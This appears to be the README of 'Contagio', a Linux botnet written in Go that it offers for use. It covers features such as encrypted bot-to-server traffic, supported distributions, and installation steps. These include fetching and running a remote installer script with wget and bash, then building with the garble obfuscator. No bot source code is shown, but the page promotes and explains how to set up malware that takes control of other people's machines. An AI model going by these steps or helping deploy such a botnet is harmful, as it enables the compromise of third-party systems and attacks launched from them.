# Contagio

Contagio is a botnet written in go.
This is a beta version so there may be bugs.


[Installation](#installation)  
[Supported systems](#supported-systems)  
[Customisation](#customisation)



### Features


- Bot written in pure go without any dependencies (native)
- All data between bot and server is encrypted
- You can run in docker container
- Customisation without programming knowledge



### Supported systems
| Os     | Status   |
|-------------|-------------|
| Linux       | &#9745;     |
| Windows     | &#9744;     |
| macOS       | &#9744;     |

Linux distributions

| Distro     | Status   |
|-------------|-------------|
| Arch        | &#9745;     |
| Manjaro        | &#9745;     |
| Fedora        | &#9745;     |
| Centos        | &#9745;     |
| Ubuntu     | &#9745;     |


system information can be found in the photos in the assets folder




### Installation
Contagio has its own installer. 
```
 wget https://raw.githubusercontent.com/TryZeroOne/Contagio/main/installer/installer.sh -O installer.sh
 bash installer.sh -[args]

 Example: bash installer.sh -default
```	   

Args:	 

|   |  |
| ------------- | ------------- |
| clean  | installs contagio without preinstalled configurations and themes. |
|  default  | installs contagio with preinstalled configurations and themes.  |


```
source ~/.bashrc 
go install mvdan.cc/garble@latest
nimble install parsetoml -y
cd Contagio 
go mod init contagio
go mod tidy
```
then follow the steps from setup.txt  
Setup guide soon...

### Customisation
Create your theme in the themes folder ( test.toml, for example), then add `ImportTheme = "./themes/test.toml"` at the beginning 
config.toml 

Docs soon...
